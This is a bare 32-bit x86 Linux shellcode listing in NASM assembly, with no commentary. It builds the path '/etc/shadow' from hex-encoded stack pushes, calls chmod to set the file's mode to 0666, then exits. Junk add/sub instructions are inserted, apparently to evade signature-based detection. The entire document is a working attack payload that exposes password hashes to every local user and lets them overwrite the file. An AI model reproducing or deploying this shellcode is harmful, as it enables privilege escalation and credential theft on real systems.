  section .text
 
       global _start
 
  _start:
       xor edx, edx
       mov bp, 1
       sub bp, 1 
       push byte 15
       pop eax
       push edx
       push byte 0x77
       push word 0x6f64
       push 0x6168732f
       push 0x6374652f
       mov ebx, esp
       push word 0666Q
       pop ecx
       int 0x80
       add bp, 2
       sub bp, 2
       push byte 1
       pop eax
	 int 0x80
